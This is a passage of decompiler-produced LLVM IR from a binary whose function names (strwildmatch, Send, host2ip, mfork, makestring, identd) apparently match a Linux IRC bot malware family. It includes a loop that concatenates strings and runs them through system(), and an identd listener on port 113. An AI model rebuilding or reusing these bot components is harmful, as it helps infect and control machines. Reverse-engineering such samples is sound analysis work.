  %v2_100002a0 = bitcast i8** %stack_var_-100 to i8*
  br label %dec_label_pc_1000024c

dec_label_pc_1000024c:                            ; preds = %dec_label_pc_10000320, %entry
  br label %dec_label_pc_10000258

dec_label_pc_10000258:                            ; preds = %dec_label_pc_1000024c, %dec_label_pc_10000258
  %storemerge34 = phi i32 [ 0, %dec_label_pc_1000024c ], [ %v1_1000030c, %dec_label_pc_10000258 ]
  store i8* inttoptr (i32 1886087532 to i8*), i8** %stack_var_-100, align 4
  %v1_10000288 = mul i32 %storemerge34, 4
  %v2_1000028c = add i32 %v1_10000288, ptrtoint ([247 x i8*]* @global_var_1001d074.258 to i32)
  %v1_10000290 = inttoptr i32 %v2_1000028c to i32*
  %v2_10000290 = load i32, i32* %v1_10000290, align 4
  store i32 %v2_10000290, i32* @r4, align 4
  %v3_100002a0 = call i32 @strcat(i8* %v2_100002a0, i32 %v2_10000290)
  store i32 268436144, i32* @lr, align 4
  %v1_100002ac = call i32 @__libc_system(i32 %v2_10000258)
  store i8* inttoptr (i32 1802071148 to i8*), i8** %stack_var_-100, align 4
  %v2_100002e8 = load i32, i32* %v1_10000290, align 4
  store i32 %v2_100002e8, i32* @r4, align 4
  %v3_100002f8 = call i32 @strcat(i8* %v2_100002a0, i32 %v2_100002e8)
  store i32 268436232, i32* @lr, align 4
  %v1_10000304 = call i32 @__libc_system(i32 %v2_10000258)
  %v1_1000030c = add nuw nsw i32 %storemerge34, 1
  %tmp12 = icmp slt i32 %v1_1000030c, 9
  br i1 %tmp12, label %dec_label_pc_10000258, label %dec_label_pc_10000320

dec_label_pc_10000320:                            ; preds = %dec_label_pc_10000258
  store i32 268436264, i32* @lr, align 4
  %v1_10000324 = call i32 @sleep(i32 5)
  br label %dec_label_pc_1000024c

; uselistorder directives
  uselistorder i32 %storemerge34, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 1, 0 }
  uselistorder i8** %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @__libc_system, { 1, 0 }
  uselistorder label %dec_label_pc_10000258, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %v2_10000350 = load i8, i8* %arg1, align 1
  %v3_10000360 = icmp eq i8 %v2_10000350, 42
  br i1 %v3_10000360, label %dec_label_pc_10000398, label %dec_label_pc_10000368

dec_label_pc_10000368:                            ; preds = %entry
  %v3_1000036c = icmp eq i8 %v2_10000350, 63
  br i1 %v3_1000036c, label %dec_label_pc_1000040c, label %dec_label_pc_10000374

dec_label_pc_10000374:                            ; preds = %dec_label_pc_10000368
  %v3_10000378 = icmp eq i8 %v2_10000350, 0
  br i1 %v3_10000378, label %dec_label_pc_10000384, label %dec_label_pc_10000468

dec_label_pc_10000384:                            ; preds = %dec_label_pc_10000374
  %v2_10000388 = load i8, i8* %tmp, align 1
  %v3_10000388 = zext i8 %v2_10000388 to i32
  br label %dec_label_pc_100004ec

dec_label_pc_10000398:                            ; preds = %entry
  %v2_1000039c = add i32 %tmp8, 1
  store i32 268436396, i32* @lr, align 4
  %v5_100003a8 = inttoptr i32 %v2_1000039c to i8*
  %v6_100003a8 = call i32 @strwildmatch(i8* %v5_100003a8, i32 %arg2, i32 %tmp8)
  %v3_100003b0 = icmp eq i32 %v6_100003a8, 0
  br i1 %v3_100003b0, label %dec_label_pc_100003f8, label %dec_label_pc_100003b8

dec_label_pc_100003b8:                            ; preds = %dec_label_pc_10000398
  %v2_100003bc = load i8, i8* %tmp, align 1
  %v3_100003c4 = icmp eq i8 %v2_100003bc, 0
  br i1 %v3_100003c4, label %dec_label_pc_10000400, label %dec_label_pc_100003cc

dec_label_pc_100003cc:                            ; preds = %dec_label_pc_100003b8
  %v2_100003d0 = add i32 %arg2, 1
  store i32 268436448, i32* @lr, align 4
  %v6_100003dc = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v2_100003d0, i32 %arg2)
  %v3_100003e4 = icmp eq i32 %v6_100003dc, 0
  br i1 %v3_100003e4, label %dec_label_pc_100003f8, label %dec_label_pc_10000400

dec_label_pc_100003f8:                            ; preds = %dec_label_pc_100003cc, %dec_label_pc_10000398
  br label %dec_label_pc_10000400

dec_label_pc_10000400:                            ; preds = %dec_label_pc_100003b8, %dec_label_pc_100003cc, %dec_label_pc_100003f8
  %storemerge3 = phi i32 [ 0, %dec_label_pc_100003f8 ], [ 1, %dec_label_pc_100003cc ], [ 1, %dec_label_pc_100003b8 ]
  br label %dec_label_pc_100004ec

dec_label_pc_1000040c:                            ; preds = %dec_label_pc_10000368
  %v2_10000410 = load i8, i8* %tmp, align 1
  %v3_10000418 = icmp eq i8 %v2_10000410, 0
  br i1 %v3_10000418, label %dec_label_pc_1000045c, label %dec_label_pc_10000420

dec_label_pc_10000420:                            ; preds = %dec_label_pc_1000040c
  %v1_10000424 = add i32 %tmp8, 1
  %v2_1000042c = add i32 %arg2, 1
  store i32 268436540, i32* @lr, align 4
  %v4_10000438 = inttoptr i32 %v1_10000424 to i8*
  %v5_10000438 = call i32 @strwildmatch(i8* %v4_10000438, i32 %v2_1000042c, i32 %arg2)
  %v3_10000440 = icmp ne i32 %v5_10000438, 0
  %. = zext i1 %v3_10000440 to i32
  br label %dec_label_pc_1000045c

dec_label_pc_1000045c:                            ; preds = %dec_label_pc_10000420, %dec_label_pc_1000040c
  %storemerge2 = phi i32 [ 1, %dec_label_pc_1000040c ], [ %., %dec_label_pc_10000420 ]
  br label %dec_label_pc_100004ec

dec_label_pc_10000468:                            ; preds = %dec_label_pc_10000374
  %v3_1000046c = load i8, i8* %arg1, align 1
  %v4_1000046c = zext i8 %v3_1000046c to i32
  store i32 268436608, i32* @lr, align 4
  %v3_1000047c = call i32 @__GI_toupper(i32 %v4_1000046c, i32 %tmp8)
  %v3_10000488 = load i8, i8* %tmp, align 1
  %v4_10000488 = zext i8 %v3_10000488 to i32
  store i32 268436636, i32* @lr, align 4
  %v3_10000498 = call i32 @__GI_toupper(i32 %v4_10000488, i32 %arg2)
  %v4_100004a0 = icmp eq i32 %v3_1000047c, %v3_10000498
  br i1 %v4_100004a0, label %dec_label_pc_100004a8, label %dec_label_pc_100004e4

dec_label_pc_100004a8:                            ; preds = %dec_label_pc_10000468
  %v1_100004ac = add i32 %tmp8, 1
  %v2_100004b4 = add i32 %arg2, 1
  store i32 268436676, i32* @lr, align 4
  %v4_100004c0 = inttoptr i32 %v1_100004ac to i8*
  %v5_100004c0 = call i32 @strwildmatch(i8* %v4_100004c0, i32 %v2_100004b4, i32 %arg2)
  %v3_100004c8 = icmp ne i32 %v5_100004c0, 0
  %.7 = zext i1 %v3_100004c8 to i32
  br label %dec_label_pc_100004e4

dec_label_pc_100004e4:                            ; preds = %dec_label_pc_100004a8, %dec_label_pc_10000468
  %storemerge = phi i32 [ 1, %dec_label_pc_10000468 ], [ %.7, %dec_label_pc_100004a8 ]
  br label %dec_label_pc_100004ec

dec_label_pc_100004ec:                            ; preds = %dec_label_pc_1000045c, %dec_label_pc_10000400, %dec_label_pc_10000384, %dec_label_pc_100004e4
  %stack_var_-36.0 = phi i32 [ %storemerge3, %dec_label_pc_10000400 ], [ %storemerge2, %dec_label_pc_1000045c ], [ %v3_10000388, %dec_label_pc_10000384 ], [ %storemerge, %dec_label_pc_100004e4 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_100004ec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10000400, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg5, i32* @r7, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 2, i32* %stack_var_-136, align 4
  store i32 ptrtoint (i32* @global_var_1001d8cc.262 to i32), i32* @r3, align 4
  %v2_10000594 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268436896, i32* @lr, align 4
  %v4_1000059c = call i32 @vsprintf(i32 ptrtoint (i32* @global_var_1001d8cc.262 to i32), i32 %arg2, i32 %v2_10000594, i32 268566528)
  store i32 ptrtoint (i32* @global_var_1001d8cc.262 to i32), i32* @r3, align 4
  %v0_100005a8 = call i32 @__GI_strlen()
  store i32 268436932, i32* @lr, align 4
  %v2_100005c0 = call i32 @__libc_write(i32 %arg1, i32 ptrtoint (i32* @global_var_1001d8cc.262 to i32))
  ret i32 %v2_100005c0

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001d8cc.262 to i32), { 1, 2, 0, 3 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268437000, i32* @lr, align 4
  %v1_10000604 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_10000604, i32* @global_var_1001d838.263, align 4
  %v4_10000620 = icmp eq i32 %v1_10000604, -1
  br i1 %v4_10000620, label %dec_label_pc_10000628, label %dec_label_pc_10000678

dec_label_pc_10000628:                            ; preds = %entry
  store i32 268437040, i32* @lr, align 4
  %v2_1000062c = call i32 @__GI_gethostbyname(i32 %arg2, i32 -1)
  %v3_1000063c = icmp eq i32 %v2_1000062c, 0
  br i1 %v3_1000063c, label %dec_label_pc_10000644, label %dec_label_pc_1000064c

dec_label_pc_10000644:                            ; preds = %dec_label_pc_10000628
  %v0_10000648 = call i32 @__GI_exit()
  br label %dec_label_pc_1000064c

dec_label_pc_1000064c:                            ; preds = %dec_label_pc_10000628, %dec_label_pc_10000644
  %v1_10000650 = add i32 %v2_1000062c, 16
  %v2_10000650 = inttoptr i32 %v1_10000650 to i32*
  %v3_10000650 = load i32, i32* %v2_10000650, align 4
  %v1_10000654 = inttoptr i32 %v3_10000650 to i32*
  %v2_10000654 = load i32, i32* %v1_10000654, align 4
  %v1_10000664 = add i32 %v2_1000062c, 12
  %v2_10000664 = inttoptr i32 %v1_10000664 to i32*
  %v3_10000664 = load i32, i32* %v2_10000664, align 4
  store i32 %v3_10000664, i32* @r5, align 4
  store i32 268437112, i32* @lr, align 4
  %v4_10000674 = call i32 @bcopy(i32 %v2_10000654, i32 ptrtoint (i32* @global_var_1001d838.263 to i32), i32 %v3_10000664, i32 %v2_1000062c)
  %v3_1000067c.pre = load i32, i32* @global_var_1001d838.263, align 4
  br label %dec_label_pc_10000678

dec_label_pc_10000678:                            ; preds = %entry, %dec_label_pc_1000064c
  %v3_1000067c = phi i32 [ %v1_10000604, %entry ], [ %v3_1000067c.pre, %dec_label_pc_1000064c ]
  ret i32 %v3_1000067c

; uselistorder directives
  uselistorder i32 %v3_10000664, { 1, 0 }
  uselistorder i32 %v2_1000062c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10000678, { 1, 0 }
  uselistorder label %dec_label_pc_1000064c, { 1, 0 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100006b8 = load i8, i8* @global_var_1001d828.264, align 1
  %v3_100006c0 = icmp eq i8 %v3_100006b8, 1
  br i1 %v3_100006c0, label %dec_label_pc_100006c8, label %dec_label_pc_100006d4

dec_label_pc_100006c8:                            ; preds = %entry
  br label %dec_label_pc_100007d8

dec_label_pc_100006d4:                            ; preds = %entry
  store i32 268437208, i32* @lr, align 4
  %v0_100006d4 = call i32 @__libc_fork()
  %v3_100006e4 = icmp eq i32 %v0_100006d4, 0
  br i1 %v3_100006e4, label %dec_label_pc_100006ec, label %dec_label_pc_100006f8

dec_label_pc_100006ec:                            ; preds = %dec_label_pc_100006d4
  br label %dec_label_pc_100007d8

dec_label_pc_100006f8:                            ; preds = %dec_label_pc_100006d4
  %v3_100006fc = load i32, i32* @global_var_1001d834.265, align 4
  %v1_10000700 = add i32 %v3_100006fc, 1
  store i32 %v1_10000700, i32* @global_var_1001d834.265, align 4
  %v1_10000714 = mul i32 %v1_10000700, 4
  %v1_10000718 = add i32 %v1_10000714, 4
  store i32 %v1_10000718, i32* @r3, align 4
  store i32 268437284, i32* @lr, align 4
  %v0_10000720 = call i32 @malloc()
  %v3_1000077c2 = load i32, i32* @global_var_1001d834.265, align 4
  %v3_100007884 = icmp eq i32 %v3_1000077c2, 1
  br i1 %v3_100007884, label %dec_label_pc_10000790, label %dec_label_pc_10000738

dec_label_pc_10000738:                            ; preds = %dec_label_pc_100006f8, %dec_label_pc_10000738
  %storemerge16 = phi i32 [ %v1_10000770, %dec_label_pc_10000738 ], [ 0, %dec_label_pc_100006f8 ]
  %v1_1000073c = mul i32 %storemerge16, 4
  %v2_10000748 = add i32 %v1_1000073c, %v0_10000720
  %v3_1000075c = load i32, i32* @global_var_1001d860.266, align 4
  %v2_10000760 = add i32 %v3_1000075c, %v1_1000073c
  %v1_10000764 = inttoptr i32 %v2_10000760 to i32*
  %v2_10000764 = load i32, i32* %v1_10000764, align 4
  %v2_10000768 = inttoptr i32 %v2_10000748 to i32*
  store i32 %v2_10000764, i32* %v2_10000768, align 4
  %v1_10000770 = add i32 %storemerge16, 1
  %v3_1000077c = load i32, i32* @global_var_1001d834.265, align 4
  %v1_10000780 = add i32 %v3_1000077c, -1
  %v3_10000788 = icmp ugt i32 %v1_10000780, %v1_10000770
  br i1 %v3_10000788, label %dec_label_pc_10000738, label %dec_label_pc_10000778.dec_label_pc_10000790_crit_edge

dec_label_pc_10000778.dec_label_pc_10000790_crit_edge: ; preds = %dec_label_pc_10000738
  br label %dec_label_pc_10000790

dec_label_pc_10000790:                            ; preds = %dec_label_pc_100006f8, %dec_label_pc_10000778.dec_label_pc_10000790_crit_edge
  %v3_10000794 = phi i32 [ %v3_1000077c, %dec_label_pc_10000778.dec_label_pc_10000790_crit_edge ], [ %v3_1000077c2, %dec_label_pc_100006f8 ]
  %v1_10000798 = mul i32 %v3_10000794, 4
  %v2_100007a4 = add i32 %v0_10000720, -4
  %v1_100007a8 = add i32 %v2_100007a4, %v1_10000798
  %v2_100007b0 = inttoptr i32 %v1_100007a8 to i32*
  store i32 %v0_100006d4, i32* %v2_100007b0, align 4
  %v3_100007b8 = load i32, i32* @global_var_1001d860.266, align 4
  store i32 %v3_100007b8, i32* @r3, align 4
  store i32 268437444, i32* @lr, align 4
  %v0_100007c0 = call i32 @free()
  store i32 %v0_10000720, i32* @global_var_1001d860.266, align 4
  br label %dec_label_pc_100007d8

dec_label_pc_100007d8:                            ; preds = %dec_label_pc_100006ec, %dec_label_pc_100006c8, %dec_label_pc_10000790
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_100006c8 ], [ 0, %dec_label_pc_100006ec ], [ %v0_100006d4, %dec_label_pc_10000790 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %v1_10000770, { 1, 0 }
  uselistorder i32 %v1_1000073c, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v3_1000077c2, { 1, 0 }
  uselistorder i32 %v0_10000720, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100007d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000790, { 1, 0 }
  uselistorder label %dec_label_pc_10000738, { 1, 0 }
}

define i32 @filter(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1000084c = add i32 %arg1, -1
  br label %dec_label_pc_10000838

dec_label_pc_10000814:                            ; preds = %dec_label_pc_10000864, %dec_label_pc_10000838
  store i32 %arg1, i32* @r3, align 4
  %v0_10000818 = call i32 @__GI_strlen()
  %v1_1000082c = add i32 %v0_10000818, %v2_1000084c
  %v3_10000834 = inttoptr i32 %v1_1000082c to i8*
  store i8 0, i8* %v3_10000834, align 1
  br label %dec_label_pc_10000838

dec_label_pc_10000838:                            ; preds = %entry, %dec_label_pc_10000814
  store i32 %arg1, i32* @r3, align 4
  %v0_1000083c = call i32 @__GI_strlen()
  %v1_10000850 = add i32 %v0_1000083c, %v2_1000084c
  %v1_10000854 = inttoptr i32 %v1_10000850 to i8*
  %v2_10000854 = load i8, i8* %v1_10000854, align 1
  %v3_1000085c = icmp eq i8 %v2_10000854, 13
  br i1 %v3_1000085c, label %dec_label_pc_10000814, label %dec_label_pc_10000864

dec_label_pc_10000864:                            ; preds = %dec_label_pc_10000838
  store i32 %arg1, i32* @r3, align 4
  %v0_10000868 = call i32 @__GI_strlen()
  %v1_1000087c = add i32 %v0_10000868, %v2_1000084c
  %v1_10000880 = inttoptr i32 %v1_1000087c to i8*
  %v2_10000880 = load i8, i8* %v1_10000880, align 1
  %v3_10000888 = icmp eq i8 %v2_10000880, 10
  br i1 %v3_10000888, label %dec_label_pc_10000814, label %dec_label_pc_10000890

dec_label_pc_10000890:                            ; preds = %dec_label_pc_10000864
  ret i32 %v0_10000868

; uselistorder directives
  uselistorder i32 %arg1, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10000838, { 1, 0 }
}

define i32 @makestring(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-1072 = alloca i32, align 4
  store i32 268437700, i32* @lr, align 4
  %v0_100008c0 = call i32 @random()
  %v2_100008dc = srem i32 %v0_100008c0, 5
  %v1_100008f8 = add nsw i32 %v2_100008dc, 4
  %v1_10000904 = add nsw i32 %v2_100008dc, 5
  store i32 %v1_10000904, i32* @r3, align 4
  store i32 268437776, i32* @lr, align 4
  %v0_1000090c = call i32 @malloc()
  store i32 268437816, i32* @lr, align 4
  %v3_10000934 = call i32 @__GI_memset(i32 %v0_1000090c, i32 0, i32 %v1_10000904)
  store i32 268437836, i32* @lr, align 4
  %v3_10000948 = call i32 @__GI_fopen(i32 ptrtoint ([16 x i8]* @global_var_1000b7fc.267 to i32), i32 ptrtoint (i32* @global_var_1000b80c.268 to i32))
  %v3_10000958 = icmp eq i32 %v3_10000948, 0
  br i1 %v3_10000958, label %dec_label_pc_100009d0.preheader, label %dec_label_pc_100009e4

dec_label_pc_100009d0.preheader:                  ; preds = %entry
  %v2_100009d88 = icmp sgt i32 %v2_100008dc, -4
  br i1 %v2_100009d88, label %dec_label_pc_1000096c, label %dec_label_pc_10000ad4

dec_label_pc_1000096c:                            ; preds = %dec_label_pc_100009d0.preheader, %dec_label_pc_1000096c
  %storemerge711 = phi i32 [ %v1_100009c8, %dec_label_pc_1000096c ], [ 0, %dec_label_pc_100009d0.preheader ]
  store i32 268437888, i32* @lr, align 4
  %v0_1000097c = call i32 @random()
  %v2_10000998 = srem i32 %v0_1000097c, 26
  %fold = add nsw i32 %v2_10000998, 65
  %v1_100009c0 = trunc i32 %fold to i8
  %v2_100009c0 = load i32, i32* @r29, align 4
  %v3_100009c0 = inttoptr i32 %v2_100009c0 to i8*
  store i8 %v1_100009c0, i8* %v3_100009c0, align 1
  %v1_100009c8 = add nuw nsw i32 %storemerge711, 1
  %v2_100009d8 = icmp slt i32 %v1_100009c8, %v1_100008f8
  br i1 %v2_100009d8, label %dec_label_pc_1000096c, label %dec_label_pc_10000ad4

dec_label_pc_100009e4:                            ; preds = %entry
  store i32 268437992, i32* @lr, align 4
  %v0_100009e4 = call i32 @random()
  store i32 268438000, i32* @lr, align 4
  %v0_100009ec = call i32 @random()
  %v0_100009f4 = load i32, i32* @r29, align 4
  %v2_100009f4 = mul i32 %v0_100009f4, %v0_100009ec
  %v2_10000a10 = srem i32 %v2_100009f4, 45402
  %v2_10000a7012 = icmp sgt i32 %v2_10000a10, -1
  %v2_10000a48 = ptrtoint i32* %stack_var_-1072 to i32
  br i1 %v2_10000a7012, label %dec_label_pc_10000a48, label %dec_label_pc_10000a78

dec_label_pc_10000a48:                            ; preds = %dec_label_pc_100009e4, %dec_label_pc_10000a48
  %storemerge615 = phi i32 [ %v1_10000a60, %dec_label_pc_10000a48 ], [ 0, %dec_label_pc_100009e4 ]
  store i32 268438108, i32* @lr, align 4
  %v3_10000a58 = call i32 @fgets(i32 %v2_10000a48, i32 1024, i32 %v3_10000948)
  %v1_10000a60 = add nuw nsw i32 %storemerge615, 1
  %v2_10000a70 = icmp slt i32 %storemerge615, %v2_10000a10
  br i1 %v2_10000a70, label %dec_label_pc_10000a48, label %dec_label_pc_10000a78

dec_label_pc_10000a78:                            ; preds = %dec_label_pc_10000a48, %dec_label_pc_100009e4
  store i32 268438160, i32* @lr, align 4
  %v3_10000a8c = call i32 @__GI_memset(i32 %v2_10000a48, i32 0, i32 1024)
  store i32 268438180, i32* @lr, align 4
  %v3_10000aa0 = call i32 @fgets(i32 %v2_10000a48, i32 1024, i32 %v3_10000948)
  store i32 268438192, i32* @lr, align 4
  %v1_10000aac = call i32 @filter(i32 %v2_10000a48)
  store i32 %v0_1000090c, i32* @r3, align 4
  store i32 %v2_10000a48, i32* @r4, align 4
  store i32 %v1_100008f8, i32* @r5, align 4
  store i32 268438220, i32* @lr, align 4
  %v0_10000ac8 = call i32 @memcpy()
  store i32 268438228, i32* @lr, align 4
  %v1_10000ad0 = inttoptr i32 %v3_10000948 to i16*
  %v2_10000ad0 = call i32 @__GI_fclose(i16* %v1_10000ad0)
  br label %dec_label_pc_10000ad4

dec_label_pc_10000ad4:                            ; preds = %dec_label_pc_1000096c, %dec_label_pc_100009d0.preheader, %dec_label_pc_10000a78
  ret i32 %v0_1000090c

; uselistorder directives
  uselistorder i32 %v1_100009c8, { 1, 0 }
  uselistorder i32 %v0_1000090c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000ad4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000a48, { 1, 0 }
  uselistorder label %dec_label_pc_1000096c, { 1, 0 }
}

define i32 @identd() local_unnamed_addr {
entry:
  %stack_var_-1180 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-1240 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-1216 = alloca i32, align 4
  %stack_var_-1196 = alloca i32, align 4
  %stack_var_-1204 = alloca i32, align 4
  %stack_var_-1212 = alloca i32, align 4
  store i32 268438300, i32* @lr, align 4
  %v3_10000b18 = call i32 @socket(i32 2, i32 1, i32 0)
  %v4_10000b2c = icmp eq i32 %v3_10000b18, -1
  br i1 %v4_10000b2c, label %dec_label_pc_10000e54, label %dec_label_pc_10000b34

dec_label_pc_10000b34:                            ; preds = %entry
  store i32 2, i32* %stack_var_-1212, align 4
  store i32 113, i32* @r3, align 4
  %v1_10000b40 = call i32 @htons(i32 113)
  %v2_10000b54 = ptrtoint i32* %stack_var_-1212 to i32
  %v2_10000b58 = ptrtoint i32* %stack_var_-1204 to i32
  store i32 0, i32* %stack_var_-1204, align 4
  store i32 268438400, i32* @lr, align 4
  %v4_10000b7c = call i32 @bind(i32 %v3_10000b18, i32 %v2_10000b54, i32 16, i32 %v2_10000b58)
  %v4_10000b88 = icmp eq i32 %v4_10000b7c, -1
  br i1 %v4_10000b88, label %dec_label_pc_10000e54, label %dec_label_pc_10000b90

dec_label_pc_10000b90:                            ; preds = %dec_label_pc_10000b34
  store i32 268438428, i32* @lr, align 4
  %v3_10000b98 = call i32 @listen(i32 %v3_10000b18, i32 1, i32 %v4_10000b7c)
  %v4_10000ba4 = icmp eq i32 %v3_10000b98, -1
  br i1 %v4_10000ba4, label %dec_label_pc_10000e54, label %dec_label_pc_10000bac

dec_label_pc_10000bac:                            ; preds = %dec_label_pc_10000b90
  store i32 268438448, i32* @lr, align 4
  %v0_10000bac = call i32 @__libc_fork()
  %v3_10000bb4 = icmp eq i32 %v0_10000bac, 0
  br i1 %v3_10000bb4, label %dec_label_pc_10000e54, label %dec_label_pc_10000bbc

dec_label_pc_10000bbc:                            ; preds = %dec_label_pc_10000bac
  store i32 16, i32* %stack_var_-1216, align 4
  %v2_10000bc4 = ptrtoint i32* %stack_var_-1196 to i32
  %v2_10000bc8 = ptrtoint i32* %stack_var_-1216 to i32
  store i32 268438492, i32* @lr, align 4
  %v4_10000bd8 = call i32 @__libc_accept(i32 %v3_10000b18, i32 %v2_10000bc4, i32 %v2_10000bc8, i32 %v2_10000bc8)
  %v4_10000bec = icmp eq i32 %v4_10000bd8, -1
  br i1 %v4_10000bec, label %dec_label_pc_10000bf4, label %dec_label_pc_10000bfc.preheader

dec_label_pc_10000bf4:                            ; preds = %dec_label_pc_10000bbc
  %v0_10000bf8 = call i32 @__GI_exit()
  br label %dec_label_pc_10000bfc.preheader

dec_label_pc_10000bfc.preheader:                  ; preds = %dec_label_pc_10000bf4, %dec_label_pc_10000bbc
  %v2_10000bfc = ptrtoint i32* %stack_var_-148 to i32
  %v1_10000c44 = udiv i32 %v4_10000bd8, 32
  %v1_10000c4c = mul nuw nsw i32 %v1_10000c44, 4
  %v2_10000c50 = ptrtoint i32* %stack_var_-1240 to i32
  %v2_10000c54 = add i32 %v2_10000c50, 1092
  %v1_10000c58 = add i32 %v2_10000c54, %v1_10000c4c
  %v1_10000c5c = inttoptr i32 %v1_10000c58 to i32*
  %v1_10000c64 = urem i32 %v4_10000bd8, 32
  %v3_10000c6c = shl i32 1, %v1_10000c64
  %v1_10000c9c = add i32 %v4_10000bd8, 1
  %v2_10000ca4 = ptrtoint i32* %stack_var_-156 to i32
  %v3_10000cf8 = sub i32 0, %v4_10000bd8
  %v4_10000cf8 = urem i32 %v3_10000cf8, 32
  %v6_10000cf8 = xor i32 %v4_10000cf8, 31
  %v12_10000cf8 = lshr i32 -1, %v1_10000c64
  %v16_10000cf8 = xor i32 %v12_10000cf8, 1
  %v14_10000cf8 = urem i32 %v12_10000cf8, 2
  br label %dec_label_pc_10000bfc

dec_label_pc_10000bfc:                            ; preds = %dec_label_pc_10000bfc.preheader, %dec_label_pc_10000cd4
  store i32 %v2_10000bfc, i32* %stack_var_-1240, align 4
  store i32 0, i32* %stack_var_-148, align 4
  br label %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge

dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge: ; preds = %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge.dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge_crit_edge, %dec_label_pc_10000bfc
  %v3_10000c14.pre = phi i32 [ %v2_10000bfc, %dec_label_pc_10000bfc ], [ %v3_10000c14.pre.pre, %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge.dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge_crit_edge ]
  %v1_10000c2c30 = phi i32 [ 1, %dec_label_pc_10000bfc ], [ %v1_10000c2c, %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge.dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge_crit_edge ]
  %v1_10000c18 = mul nuw nsw i32 %v1_10000c2c30, 4
  %v2_10000c1c = add i32 %v1_10000c18, %v3_10000c14.pre
  %v2_10000c24 = inttoptr i32 %v2_10000c1c to i32*
  store i32 0, i32* %v2_10000c24, align 4
  %v1_10000c2c = add nuw nsw i32 %v1_10000c2c30, 1
  %tmp25 = icmp ult i32 %v1_10000c2c, 32
  br i1 %tmp25, label %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge.dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge_crit_edge, label %dec_label_pc_10000c40

dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge.dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge_crit_edge: ; preds = %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge
  %v3_10000c14.pre.pre = load i32, i32* %stack_var_-1240, align 4
  br label %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge

dec_label_pc_10000c40:                            ; preds = %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge
  %v2_10000c5c = load i32, i32* %v1_10000c5c, align 4
  %v2_10000c70 = or i32 %v2_10000c5c, %v3_10000c6c
  store i32 %v2_10000c70, i32* %v1_10000c5c, align 4
  store i32 60, i32* %stack_var_-156, align 4
  store i32 268438720, i32* @lr, align 4
  %v6_10000cbc = call i32 @__libc_select(i32 %v1_10000c9c, i32 %v2_10000bfc, i32 0, i32 0, i32 %v2_10000ca4, i32 %v2_10000bfc)
  %tmp26 = icmp sgt i32 %v6_10000cbc, -1
  br i1 %tmp26, label %dec_label_pc_10000cd4, label %dec_label_pc_10000ccc

dec_label_pc_10000ccc:                            ; preds = %dec_label_pc_10000c40
  %v0_10000cd0 = call i32 @__GI_exit()
  br label %dec_label_pc_10000cd4

dec_label_pc_10000cd4:                            ; preds = %dec_label_pc_10000c40, %dec_label_pc_10000ccc
  %v2_10000cec = load i32, i32* %v1_10000c5c, align 4
  %v5_10000cf8 = shl i32 %v2_10000cec, %v4_10000cf8
  %v7_10000cf8 = lshr i32 %v2_10000cec, %v6_10000cf8
  %v8_10000cf8 = udiv i32 %v7_10000cf8, 2
  %v9_10000cf8 = or i32 %v8_10000cf8, %v5_10000cf8
  %tmp = icmp slt i32 %v2_10000cec, 0
  %v15_10000cf82 = zext i1 %tmp to i32
  %v17_10000cf8 = and i32 %v15_10000cf82, %v16_10000cf8
  %v14_10000cf8.masked = and i32 %v14_10000cf8, %v9_10000cf8
  %v1_10000d00 = or i32 %v14_10000cf8.masked, %v17_10000cf8
  %v3_10000d04 = icmp eq i32 %v1_10000d00, 0
  br i1 %v3_10000d04, label %dec_label_pc_10000bfc, label %dec_label_pc_10000d10

dec_label_pc_10000d10:                            ; preds = %dec_label_pc_10000cd4
  %v2_10000d10 = ptrtoint i32* %stack_var_-1180 to i32
  store i32 268438824, i32* @lr, align 4
